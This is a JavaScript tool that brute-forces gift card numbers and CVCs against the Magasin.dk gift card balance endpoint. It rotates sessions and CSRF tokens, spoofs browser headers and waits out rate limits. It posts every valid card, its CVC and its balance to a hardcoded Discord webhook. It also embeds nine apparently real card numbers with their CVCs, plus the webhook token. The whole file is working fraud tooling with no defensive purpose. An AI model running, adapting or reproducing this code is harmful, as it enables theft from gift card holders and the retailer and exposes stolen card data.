// node maga.js — Railway headless, known cards first for verification

const https = require('https');
const zlib  = require('zlib');

// ── UNLOCK SOCKETS ─────────────────────────────────────────────────────
const agent = new https.Agent({
  keepAlive:      true,
  maxSockets:     Infinity,
  maxFreeSockets: 256,
  timeout:        10000,
});

// ── CONFIG ─────────────────────────────────────────────────────────────
const WEBHOOK          = "https://discord.com/api/webhooks/1498901716811124836/VCrh2UqoiOEtM2CUSMvZjp3Y9jwDNpwZ9FiLAaoTYxz8TgSQVCQ34BO8s7O_fz8b3XlK";
const CARD_PREFIXES    = ["303940", "303920"];
const CARD_CONCURRENCY = 25;
const CVC_CONCURRENCY  = 12;
const CSRF_TTL_MS      = 25 * 60 * 1000;
const PROGRESS_MS      = 10 * 60 * 1000;

// ── KNOWN REAL CARDS — checked first for verification ──────────────────
const KNOWN_CARDS = [
  { number: '3039409388', cvc: '531' },
  { number: '3039409623', cvc: '622' },
  { number: '3039409784', cvc: '318' },
  { number: '3039409896', cvc: '142' },
  { number: '3039209013', cvc: '623' },
  { number: '3039209011', cvc: '551' },
  { number: '3039208936', cvc: '374' },
  { number: '3039208790', cvc: '449' },
  { number: '3039208686', cvc: '854' },
];

// ── KNOWN SUFFIXES — hit these first in main sweep ─────────────────────
const KNOWN_SUFFIXES = new Set([9388, 9623, 9784, 9896, 9013, 9011, 8936, 8790, 8686]);

// ── SESSION POOL ───────────────────────────────────────────────────────
const sessions = Array.from({ length: CARD_CONCURRENCY }, () => ({
  cookies:     '',
  csrf:        '',
  refreshedAt: 0,
}));

// ── HTTP ───────────────────────────────────────────────────────────────
function httpRequest(options, body = null) {
  return new Promise((resolve) => {
    const req = https.request({ ...options, agent }, (res) => {
      const chunks = [];
      let stream   = res;
      const enc    = res.headers['content-encoding'] || '';
      if      (enc.includes('gzip'))    stream = res.pipe(zlib.createGunzip());
      else if (enc.includes('br'))      stream = res.pipe(zlib.createBrotliDecompress());
      else if (enc.includes('deflate')) stream = res.pipe(zlib.createInflate());

      stream.on('data', c => chunks.push(c));
      stream.on('end', () => resolve({
        status:  res.statusCode,
        headers: res.headers,
        body:    Buffer.concat(chunks).toString(),
      }));
      stream.on('error', () => resolve({ status: 0, headers: {}, body: '' }));
    });
    req.on('error',   () => resolve({ status: 0, headers: {}, body: '' }));
    req.on('timeout', () => { req.destroy(); resolve({ status: 0, headers: {}, body: '' }); });
    if (body) req.write(body);
    req.end();
  });
}

// ── DISCORD ────────────────────────────────────────────────────────────
function discordPost(payload) {
  return new Promise((resolve) => {
    const body = JSON.stringify(payload);
    const url  = new URL(WEBHOOK);
    const req  = https.request({
      hostname: url.hostname,
      path:     url.pathname + url.search,
      method:   'POST',
      headers: {
        'Content-Type':   'application/json',
        'Content-Length': Buffer.byteLength(body),
        'User-Agent':     'MagasinChecker/1.0',
      },
      timeout: 8000,
    }, (res) => { res.resume(); resolve(res.statusCode); });
    req.on('error',   () => resolve(0));
    req.on('timeout', () => { req.destroy(); resolve(0); });
    req.write(body);
    req.end();
  });
}

// ── SESSION REFRESH ────────────────────────────────────────────────────
async function refreshSession(slot, force = false) {
  const now = Date.now();
  if (!force && sessions[slot].csrf && (now - sessions[slot].refreshedAt) < CSRF_TTL_MS) {
    return true;
  }

  const res = await httpRequest({
    hostname: 'www.magasin.dk',
    path:     '/gavekortsaldo/',
    method:   'GET',
    headers: {
      'Accept':          'text/html,application/xhtml+xml,*/*',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'en-GB,en;q=0.9',
      'User-Agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Sec-Fetch-Mode':  'navigate',
      'Sec-Fetch-Site':  'none',
      'Sec-Fetch-Dest':  'document',
      'Cookie':          sessions[slot].cookies,
    },
    timeout: 12000,
  });

  const cookieMap = {};
  sessions[slot].cookies.split('; ').forEach(c => {
    const idx = c.indexOf('=');
    if (idx > 0) cookieMap[c.slice(0, idx).trim()] = c.slice(idx + 1);
  });
  (res.headers['set-cookie'] || []).forEach(cookie => {
    const part = cookie.split(';')[0];
    const idx  = part.indexOf('=');
    if (idx > 0) cookieMap[part.slice(0, idx).trim()] = part.slice(idx + 1);
  });
  sessions[slot].cookies     = Object.entries(cookieMap).map(([k,v]) => `${k}=${v}`).join('; ');
  sessions[slot].refreshedAt = now;

  const m = res.body.match(/name="csrf_token"\s+value="([^"]+)"/)
         || res.body.match(/"csrf_token"\s*:\s*"([^"]+)"/);
  if (m) sessions[slot].csrf = m[1];

  return !!sessions[slot].csrf;
}

// ── MULTIPART ──────────────────────────────────────────────────────────
function buildMultipart(cardNumber, cvc, csrf, boundary) {
  return [
    `--${boundary}\r\nContent-Disposition: form-data; name="dwfrm_profile_customer_giftCardNumber"\r\n\r\n${cardNumber}`,
    `--${boundary}\r\nContent-Disposition: form-data; name="dwfrm_profile_customer_securityCode"\r\n\r\n${cvc}`,
    `--${boundary}\r\nContent-Disposition: form-data; name="csrf_token"\r\n\r\n${csrf}`,
    `--${boundary}--`,
  ].join('\r\n');
}

// ── CHECK ONE CARD ─────────────────────────────────────────────────────
async function checkCard(cardNumber, cvc, slot) {
  const boundary = '----WebKitFormBoundary' + Math.random().toString(36).slice(2,18).toUpperCase();
  const body     = buildMultipart(cardNumber, cvc, sessions[slot].csrf, boundary);

  const res = await httpRequest({
    hostname: 'www.magasin.dk',
    path:     '/on/demandware.store/Sites-DK-Site/da_DK/Account-CheckGiftCardBalance',
    method:   'POST',
    headers: {
      'Accept':           '*/*',
      'Accept-Encoding':  'gzip, deflate, br',
      'Accept-Language':  'en-GB,en;q=0.9',
      'Content-Type':     `multipart/form-data; boundary=${boundary}`,
      'Content-Length':   Buffer.byteLength(body),
      'Cookie':           sessions[slot].cookies,
      'Origin':           'https://www.magasin.dk',
      'Referer':          'https://www.magasin.dk/gavekortsaldo/',
      'User-Agent':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'X-Requested-With': 'XMLHttpRequest',
      'Sec-Fetch-Mode':   'cors',
      'Sec-Fetch-Site':   'same-origin',
      'Sec-Fetch-Dest':   'empty',
    },
    timeout: 10000,
  }, body);

  try {
    const json    = JSON.parse(res.body);
    const balance = parseFloat((json.balance || '0').replace(/[^\d.,]/g, '').replace(',', '.')) || 0;
    const csrfExp = !!(json.error && typeof json.error === 'string' && json.error.toLowerCase().includes('csrf'));
    const valid   = json.success === true;
    return { balance, status: res.status, csrfExpired: csrfExp, valid, raw: res.body.slice(0, 200) };
  } catch {
    return { balance: 0, status: res.status, csrfExpired: false, valid: false, raw: res.body.slice(0, 200) };
  }
}

// ── DISCORD — hit/valid alert ──────────────────────────────────────────
async function sendHit(cardNumber, cvc, balance, label = '') {
  await discordPost({
    embeds: [{
      title: balance > 0
        ? '💳 HIT — Magasin Gavekort med saldo!'
        : `✅ Valid card — 0 balance${label ? ' ' + label : ''}`,
      color: balance > 0 ? 0x00ff88 : 0xcc00ff,
      fields: [
        { name: 'Kortnummer', value: cardNumber,          inline: true },
        { name: 'CVC',        value: cvc,                 inline: true },
        { name: 'Saldo',      value: `**${balance} kr**`, inline: true },
      ],
      footer:    { text: 'Magasin Checker • Railway' },
      timestamp: new Date().toISOString(),
    }]
  });
}

// ── DISCORD — progress ─────────────────────────────────────────────────
async function sendProgress(stats, cardCursor, totalCards, totalChks) {
  const elapsed = (Date.now() - stats.start) / 1000;
  const rate    = (stats.checked / Math.max(1, elapsed)).toFixed(0);
  const pct     = (cardCursor / totalCards * 100).toFixed(1);
  const eta     = rate > 0 ? Math.round((totalChks - stats.checked) / rate) : 0;
  const etaStr  = eta > 3600
    ? `${Math.floor(eta/3600)}h ${Math.floor((eta%3600)/60)}m`
    : `${Math.floor(eta/60)}m ${eta%60}s`;
  const elStr   = elapsed > 3600
    ? `${Math.floor(elapsed/3600)}h ${Math.floor((elapsed%3600)/60)}m`
    : `${Math.floor(elapsed/60)}m`;

  await discordPost({
    embeds: [{
      title: '📊 Progress Update',
      color: 0x5865f2,
      fields: [
        { name: '✅ Checked',  value: stats.checked.toLocaleString(), inline: true },
        { name: '💚 Valid',    value: String(stats.valid),            inline: true },
        { name: '💳 Hits',     value: String(stats.hits),             inline: true },
        { name: '⚡ Speed',    value: `${rate}/s`,                    inline: true },
        { name: '📈 Progress', value: `${pct}%`,                      inline: true },
        { name: '⏱ ETA',      value: etaStr,                         inline: true },
        { name: '🕐 Running',  value: elStr,                          inline: false },
      ],
      footer:    { text: 'Magasin Checker • Railway' },
      timestamp: new Date().toISOString(),
    }]
  });
}

// ── CVC LIST — mid-range first ─────────────────────────────────────────
function buildCVCList() {
  const mid  = Array.from({ length: 800 }, (_, i) => (i + 100).toString().padStart(3, '0'));
  const low  = Array.from({ length: 100 }, (_, i) => i.toString().padStart(3, '0'));
  const high = Array.from({ length: 100 }, (_, i) => (i + 900).toString().padStart(3, '0'));
  return [...mid, ...low, ...high];
}

const CVC_LIST = buildCVCList();

// ── CARD LIST — known suffixes first, then full range ──────────────────
function buildCardList() {
  const cards = [];

  // known valid suffixes first — verification sweep
  const knownSuffixList = [9388, 9623, 9784, 9896, 9013, 9011, 8936, 8790, 8686];
  for (const suffix of knownSuffixList) {
    const s = suffix.toString().padStart(4, '0');
    for (const prefix of CARD_PREFIXES) cards.push(prefix + s);
  }

  // then full range, skipping known (already covered)
  for (let suffix = 8686; suffix <= 9999; suffix++) {
    if (KNOWN_SUFFIXES.has(suffix)) continue;
    const s = suffix.toString().padStart(4, '0');
    for (const prefix of CARD_PREFIXES) cards.push(prefix + s);
  }

  return cards;
}

// ── SWEEP CVCs FOR ONE CARD ────────────────────────────────────────────
async function sweepCard(cardNumber, slot, stats) {
  const hits         = [];
  let cursor         = 0;
  let consecutive429 = 0;

  async function worker() {
    while (cursor < CVC_LIST.length) {
      const myCVC = CVC_LIST[cursor++];
      if (!myCVC) return;

      await refreshSession(slot);
      const result = await checkCard(cardNumber, myCVC, slot);

      if (result.csrfExpired) {
        cursor--;
        await refreshSession(slot, true);
        continue;
      }

      if (result.status === 429 || result.status === 503) {
        cursor--;
        consecutive429++;
        const wait = Math.min(1000 * Math.pow(2, consecutive429), 30000);
        await new Promise(r => setTimeout(r, wait));
        continue;
      }

      consecutive429 = 0;
      stats.checked++;

      if (result.valid) hits.push({ cvc: myCVC, balance: result.balance });
    }
  }

  await Promise.all(Array.from({ length: CVC_CONCURRENCY }, worker));
  return hits;
}

// ── VERIFICATION — check known cards with exact CVCs first ─────────────
async function verifyKnownCards() {
  console.log(`[VERIFY] Checking ${KNOWN_CARDS.length} known cards with exact CVCs...`);

  await discordPost({
    embeds: [{
      title: '🔍 Verification Starting',
      color: 0xffa500,
      description: `Checking ${KNOWN_CARDS.length} known real cards to confirm checker is working.`,
      footer:    { text: 'Magasin Checker • Railway' },
      timestamp: new Date().toISOString(),
    }]
  });

  let passed = 0;
  let failed = 0;

  for (const card of KNOWN_CARDS) {
    await refreshSession(0);
    const result = await checkCard(card.number, card.cvc, 0);
    const status = result.valid ? '✅ VALID' : result.status === 0 ? '❌ NO CONN' : `❌ INVALID (${result.status})`;
    console.log(`[VERIFY] ${card.number} / ${card.cvc} → ${status} | raw: ${result.raw}`);

    if (result.valid) {
      passed++;
      await sendHit(card.number, card.cvc, result.balance, '(verification)');
    } else {
      failed++;
    }
  }

  console.log(`[VERIFY] Done. ${passed} passed, ${failed} failed.`);

  await discordPost({
    embeds: [{
      title: passed > 0 ? '✅ Verification Passed' : '❌ Verification Failed',
      color: passed > 0 ? 0x00ff88 : 0xff0000,
      description: passed > 0
        ? `${passed}/${KNOWN_CARDS.length} known cards confirmed valid. Checker is working. Starting full sweep.`
        : `0/${KNOWN_CARDS.length} known cards returned valid. API may be broken or CSRF expired. Check logs.`,
      footer:    { text: 'Magasin Checker • Railway' },
      timestamp: new Date().toISOString(),
    }]
  });

  return passed > 0;
}

// ── MAIN ───────────────────────────────────────────────────────────────
async function main() {
  const cardList   = buildCardList();
  const totalCards = cardList.length;
  const totalChks  = totalCards * 1000;

  console.log(`[BOOT] Magasin Checker — Railway`);
  console.log(`[INFO] Cards: ${totalCards} | Checks: ${totalChks.toLocaleString()} | Concurrency: ${CARD_CONCURRENCY * CVC_CONCURRENCY}`);
  console.log(`[INFO] Booting ${CARD_CONCURRENCY} sessions...`);

  await Promise.all(sessions.map((_, i) => refreshSession(i, true)));
  console.log(`[INFO] All sessions live.`);

  await discordPost({
    embeds: [{
      title: '🚀 Checker Started',
      color: 0x5865f2,
      fields: [
        { name: 'Cards',        value: totalCards.toLocaleString(),             inline: true },
        { name: 'Total checks', value: totalChks.toLocaleString(),              inline: true },
        { name: 'Concurrency',  value: `${CARD_CONCURRENCY * CVC_CONCURRENCY}`, inline: true },
      ],
      footer:    { text: 'Magasin Checker • Railway' },
      timestamp: new Date().toISOString(),
    }]
  });

  // run verification first — if 0 pass, still sweep but Discord warned
  await verifyKnownCards();

  console.log(`[INFO] Starting full sweep.`);

  const stats    = { checked: 0, valid: 0, hits: 0, start: Date.now() };
  let cardCursor = 0;

  const progressInterval = setInterval(() => {
    sendProgress(stats, cardCursor, totalCards, totalChks);
    console.log(`[PROGRESS] ${stats.checked.toLocaleString()} checked | ${stats.valid} valid | ${stats.hits} hits`);
  }, PROGRESS_MS);

  const logInterval = setInterval(() => {
    const rate = (stats.checked / Math.max(1, (Date.now() - stats.start) / 1000)).toFixed(0);
    const pct  = (cardCursor / totalCards * 100).toFixed(1);
    console.log(`[${new Date().toISOString()}] ${pct}% | ${stats.checked.toLocaleString()} chk | ${stats.valid} valid | ${stats.hits} hits | ${rate}/s`);
  }, 30000);

  async function cardWorker(slot) {
    while (true) {
      const idx = cardCursor++;
      if (idx >= cardList.length) return;
      const cardNumber = cardList[idx];
      const hits       = await sweepCard(cardNumber, slot, stats);
      for (const h of hits) {
        stats.valid++;
        if (h.balance > 0) stats.hits++;
        console.log(`[${h.balance > 0 ? 'HIT' : 'VALID'}] ${cardNumber} / ${h.cvc} → ${h.balance} kr`);
        await sendHit(cardNumber, h.cvc, h.balance);
      }
    }
  }

  await Promise.all(Array.from({ length: CARD_CONCURRENCY }, (_, i) => cardWorker(i)));

  clearInterval(progressInterval);
  clearInterval(logInterval);

  const elapsed = ((Date.now() - stats.start) / 1000).toFixed(0);
  console.log(`[DONE] ${stats.checked.toLocaleString()} checked | ${stats.valid} valid | ${stats.hits} hits | ${elapsed}s`);

  await discordPost({
    embeds: [{
      title: '✅ Sweep Complete',
      color: 0x00ff88,
      fields: [
        { name: 'Checked', value: stats.checked.toLocaleString(),                                   inline: true },
        { name: 'Valid',   value: String(stats.valid),                                              inline: true },
        { name: 'Hits',    value: String(stats.hits),                                               inline: true },
        { name: 'Time',    value: `${Math.floor(elapsed/3600)}h ${Math.floor((elapsed%3600)/60)}m`, inline: true },
      ],
      footer:    { text: 'Magasin Checker • Railway' },
      timestamp: new Date().toISOString(),
    }]
  });
}

main().catch(e => {
  console.error('[CRASH]', e);
  process.exit(1);
});